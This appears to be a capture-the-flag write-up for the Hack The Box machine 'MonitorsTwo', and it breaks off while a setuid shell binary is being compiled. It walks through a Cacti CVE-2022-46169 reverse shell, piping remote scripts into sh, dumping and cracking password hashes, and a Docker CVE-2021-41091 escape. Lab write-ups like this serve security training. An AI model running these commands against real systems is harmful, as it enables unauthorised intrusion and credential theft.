# MonitorsTwo

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.156.2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 19:05 UTC
Nmap scan report for 10.129.156.2
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/29%OT=22%CT=1%CU=43388%PV=Y%DS=2%DC=T%G=Y%TM=644D6AB
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   96.33 ms 10.10.16.1
2   48.50 ms 10.129.156.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.41 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.156.2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 19:06 UTC
Nmap scan report for 10.129.156.2
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/29%OT=22%CT=1%CU=32588%PV=Y%DS=2%DC=T%G=Y%TM=644D6AE
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   97.66 ms 10.10.16.1
2   48.96 ms 10.129.156.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.57 seconds
```

```c
$ sudo nmap -sV -sU 10.129.156.2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 19:07 UTC
Nmap scan report for 10.129.156.2
Host is up (0.053s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1206.34 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.156.2

```c
$ whatweb http://10.129.156.2/
http://10.129.156.2/ [200 OK] Cacti, Cookies[Cacti], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[Cacti], IP[10.129.156.2], JQuery, PHP[7.4.33], PasswordField[login_password], Script[text/javascript], Title[Login to Cacti], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.4.33], X-UA-Compatible[IE=Edge], nginx[1.18.0]
```

## Foothold via CVE-2022-46169

> https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/

> https://github.com/JacobEbben/CVE-2022-46169_unauth_remote_code_execution

```c
$ wget https://raw.githubusercontent.com/JacobEbben/CVE-2022-46169_unauth_remote_code_execution/main/exploit.py
--2023-04-29 19:09:09--  https://raw.githubusercontent.com/JacobEbben/CVE-2022-46169_unauth_remote_code_execution/main/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7471 (7.3K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                                 100%[========================================================================================================================================>]   7.30K  --.-KB/s    in 0.005s  

2023-04-29 19:09:09 (1.54 MB/s) - ‘exploit.py’ saved [7471/7471]
```

```c
$ python3 exploit.py 
usage: exploit.py [-h] -t TARGET -I ATK_IP -P ATK_PORT [-x PROXY] [--bypass-ip BYPASS_IP] [--max-host-id MAX_HOST_ID] [--max-data-id MAX_DATA_ID] [--aggressive]
exploit.py: error: the following arguments are required: -t/--target, -I/--atk-ip, -P/--atk-port
```

```c
$ python3 exploit.py -t http://10.129.156.2 -I 10.10.16.33 -P 9001                             
[INFO] Starting exploitation ...
[INFO] Attempting to find a vulnerable data_id for host_id 1 ...
[SUCCESS] It appears that a vulnerable option was found!
```

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.33] from (UNKNOWN) [10.129.156.2] 42224
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

### Enumeration

#### LinPEAS

```c
$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20230319/linpeas.sh
--2023-04-29 19:11:15--  https://github.com/carlospolop/PEASS-ng/releases/download/20230319/linpeas.sh
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/29a7ad1f-b3f9-4226-9cdd-5ddf77f6a74f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230429%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230429T191037Z&X-Amz-Expires=300&X-Amz-Signature=9591fdaeb306e0e47ef20594ece7218d12b8eb11cf327b0ec00cf0ef3e196771&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2023-04-29 19:11:15--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/29a7ad1f-b3f9-4226-9cdd-5ddf77f6a74f?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230429%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230429T191037Z&X-Amz-Expires=300&X-Amz-Signature=9591fdaeb306e0e47ef20594ece7218d12b8eb11cf327b0ec00cf0ef3e196771&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828172 (809K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 808.76K  2.23MB/s    in 0.4s    

2023-04-29 19:11:16 (2.23 MB/s) - ‘linpeas.sh’ saved [828172/828172]
```

```c
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
www-data@50bca5e748b0:/dev/shm$ curl http://10.10.16.33/linpeas.sh | sh
```

```c                          
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
strace Not Found                                                                                                                                                                                                                            
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd                                                                                                                                                                                    
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 31K Oct 14  2020 /sbin/capsh
-rwsr-xr-x 1 root root 55K Jan 20  2022 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 35K Jan 20  2022 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Jan 20  2022 /bin/su
```

```c
╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                                                                             
Current env capabilities:                                                                                                                                                                                                                   
Current: cap_chown,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_audit_write,cap_setfcap=eip
Current proc capabilities:
CapInh: 00000000a00425f9
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 00000000a00425f9
CapAmb: 0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
```

#### Privilege Escalation to root inside the Docker Container

> https://gtfobins.github.io/gtfobins/capsh/

```c
www-data@50bca5e748b0:/dev/shm$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh  --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Seemed to be a dead end. Not sure if it was intended to be vulnerable to this or not.

## Back to Enumeration

### deepce

> https://github.com/stealthcopter/deepce

```c
$ wget https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh
--2023-04-29 19:37:06--  https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38533 (38K) [text/plain]
Saving to: ‘deepce.sh’

deepce.sh                                                  100%[========================================================================================================================================>]  37.63K  --.-KB/s    in 0.08s   

2023-04-29 19:37:07 (472 KB/s) - ‘deepce.sh’ saved [38533/38533]
```

```c
curl http://10.10.16.33/deepce.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 38533  100 38533    0     0   112k      0 --:--:-- --:--:-- --:--:--  112k

                      ##         .
                ## ## ##        ==                                                                                                                                                                                                          
             ## ## ## ##       ===                                                                                                                                                                                                          
         /"""""""""""""""""\___/ ===                                                                                                                                                                                                        
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~                                                                                                                                                                                                 
         \______ X           __/
           \    \         __/                                                                                                                                                                                                               
            \____\_______/                                                                                                                                                                                                                  
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter
```

```c
[+] Passwords in common files ........... Yes
/entrypoint.sh:5:if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
/entrypoint.sh:6:    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql                                                                                                                                            
/entrypoint.sh:7:    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"                                                                                           
/entrypoint.sh:8:    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
```

### Hashes in MySQL Database

```c
www-data@50bca5e748b0:/var/www/html$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth \G"
<password=root cacti -e "select * from user_auth \G"
*************************** 1. row ***************************
                    id: 1
              username: admin
              password: $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
                 realm: 0
             full_name: Jamie Thompson
         email_address: admin@monitorstwo.htb
  must_change_password: 
       password_change: on
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 2
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked: 
       failed_attempts: 0
              lastfail: 0
           reset_perms: 663348655
*************************** 2. row ***************************
                    id: 3
              username: guest
              password: 43e9a4ab75570f5b
                 realm: 0
             full_name: Guest Account
         email_address: 
  must_change_password: on
       password_change: on
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: 3
            login_opts: 1
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: 
            lastchange: -1
             lastlogin: -1
      password_history: -1
                locked: 
       failed_attempts: 0
              lastfail: 0
           reset_perms: 0
*************************** 3. row ***************************
                    id: 4
              username: marcus
              password: $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
                 realm: 0
             full_name: Marcus Brune
         email_address: marcus@monitorstwo.htb
  must_change_password: 
       password_change: 
             show_tree: on
             show_list: on
          show_preview: on
        graph_settings: on
            login_opts: 1
         policy_graphs: 1
          policy_trees: 1
          policy_hosts: 1
policy_graph_templates: 1
               enabled: on
            lastchange: -1
             lastlogin: -1
      password_history: 
                locked: on
       failed_attempts: 0
              lastfail: 0
           reset_perms: 2135691668
```

| Hash |
| --- |
| $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |

## Cracking the Hash with John

```c
$ cat hash 
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

```c
$ sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)     
1g 0:00:01:22 DONE (2023-04-29 19:28) 0.01208g/s 103.1p/s 103.1c/s 103.1C/s 474747..coucou
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Privielge Escalation to marcus

| Username | Password |
| --- | --- |
| marcus | funkymonkey |

```c
$ ssh marcus@10.129.156.2
The authenticity of host '10.129.156.2 (10.129.156.2)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:169: [hashed name]
    ~/.ssh/known_hosts:188: [hashed name]
    ~/.ssh/known_hosts:258: [hashed name]
    ~/.ssh/known_hosts:300: [hashed name]
    ~/.ssh/known_hosts:301: [hashed name]
    ~/.ssh/known_hosts:302: [hashed name]
    ~/.ssh/known_hosts:316: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.156.2' (ED25519) to the list of known hosts.
marcus@10.129.156.2's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 29 Apr 2023 07:29:04 PM UTC

  System load:                      0.0
  Usage of /:                       63.1% of 6.73GB
  Memory usage:                     17%
  Swap usage:                       0%
  Processes:                        235
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.156.2
  IPv6 address for eth0:            dead:beef::250:56ff:fe96:3f7d


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$
```

## user.txt

```c
marcus@monitorstwo:~$ cat user.txt 
a537aa4fdfa38aa6d5a74901d0cbc001
```

### Pivoting

```c
marcus@monitorstwo:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
```

```c
marcus@monitorstwo:~$ sudo -l
[sudo] password for marcus: 
Sorry, user marcus may not run sudo on localhost.
```

```c
marcus@monitorstwo:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
marcus:x:1000:1000:,,,:/home/marcus:/bin/bash
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:997::/var/log/laurel:/bin/false
```

```c
marcus@monitorstwo:/var/mail$ cat marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

## Privilege Escalation to root due to CVE-2021-41091

> https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure

We used `findmount` to get the paths for the mounted directories inside the container.

```c
marcus@monitorstwo:/var/mail$ findmnt
TARGET                                SOURCE      FSTYPE      OPTIONS
/                                     /dev/sda2   ext4        rw,relatime
├─/sys                                sysfs       sysfs       rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security              securityfs  securityfs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup                    tmpfs       tmpfs       ro,nosuid,nodev,noexec,mode=755
│ │ ├─/sys/fs/cgroup/unified          cgroup2     cgroup2     rw,nosuid,nodev,noexec,relatime,nsdelegate
│ │ ├─/sys/fs/cgroup/systemd          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,xattr,name=systemd
│ │ ├─/sys/fs/cgroup/blkio            cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,blkio
│ │ ├─/sys/fs/cgroup/cpuset           cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,cpuset
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,cpu,cpuacct
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,hugetlb
│ │ ├─/sys/fs/cgroup/freezer          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,freezer
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,net_cls,net_prio
│ │ ├─/sys/fs/cgroup/perf_event       cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,perf_event
│ │ ├─/sys/fs/cgroup/memory           cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,memory
│ │ ├─/sys/fs/cgroup/devices          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,devices
│ │ ├─/sys/fs/cgroup/pids             cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,pids
│ │ └─/sys/fs/cgroup/rdma             cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,rdma
│ ├─/sys/fs/pstore                    pstore      pstore      rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/bpf                       none        bpf         rw,nosuid,nodev,noexec,relatime,mode=700
│ ├─/sys/kernel/debug                 debugfs     debugfs     rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/tracing               tracefs     tracefs     rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/config                configfs    configfs    rw,nosuid,nodev,noexec,relatime
│ └─/sys/fs/fuse/connections          fusectl     fusectl     rw,nosuid,nodev,noexec,relatime
├─/proc                               proc        proc        rw,nosuid,nodev,noexec,relatime
│ └─/proc/sys/fs/binfmt_misc          systemd-1   autofs      rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=16917
│   └─/proc/sys/fs/binfmt_misc        binfmt_misc binfmt_misc rw,nosuid,nodev,noexec,relatime
├─/dev                                udev        devtmpfs    rw,nosuid,noexec,relatime,size=1966928k,nr_inodes=491732,mode=755
│ ├─/dev/pts                          devpts      devpts      rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
│ ├─/dev/shm                          tmpfs       tmpfs       rw,nosuid,nodev
│ ├─/dev/hugepages                    hugetlbfs   hugetlbfs   rw,relatime,pagesize=2M
│ └─/dev/mqueue                       mqueue      mqueue      rw,nosuid,nodev,noexec,relatime
├─/run                                tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,size=402608k,mode=755
│ ├─/run/lock                         tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,size=5120k
│ ├─/run/docker/netns/934e8c3872ef    nsfs[net:[4026532598]]
│ │                                               nsfs        rw
│ ├─/run/user/1000                    tmpfs       tmpfs       rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,gid=1000
│ └─/run/docker/netns/f8eff6760ba7    nsfs[net:[4026532662]]
│                                                 nsfs        rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI5TXU76FU:/var/lib/docker/overlay2/l/XKE4ZK5GJUTHXKVYS4MQMJ3NOB:/var/lib/docker/overlay2/l/3JPYTR54WWK2EX6DJ7
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/overlay2/l/CXAW6LQU6QOKNSSNUR
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k
```

At first we tried `/shm` which did not worked at all. So we switched to `/merged` and especially the second one. Alternatively we could
used `/diff` to get the same content.

```c
marcus@monitorstwo:/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```

or

```c
marcus@monitorstwo:/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff
```

In the container we moved to `/` and compiled the binary, which was totally unnecessary because we simply could have used `/bin/bash` but yeah, whatever.

```c
$ cat shell.c 
#include <unistd.h>
#include <errno.h>

main( int argc, char ** argv, char ** envp )
{
        setuid(0);
        setgid(0);
        envp = 0;
        system ("/bin/bash", argv, envp);
return;
}
```

```c
wget http://10.10.16.33/shell.c
--2023-04-29 20:08:32--  http://10.10.16.33/shell.c
Connecting to 10.10.16.33:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 167 [text/x-csrc]
Saving to: 'shell.c'

     0K                                                       100% 6.56K=0.02s

2023-04-29 20:08:33 (6.56 KB/s) - 'shell.c' saved [167/167]
```

```c
gcc shell.c -o shell
shell.c:4:1: warning: return type defaults to 'int' [-Wimplicit-int]
    4 | main( int argc, char ** argv, char ** envp )
      | ^~~~
shell.c: In function 'main':
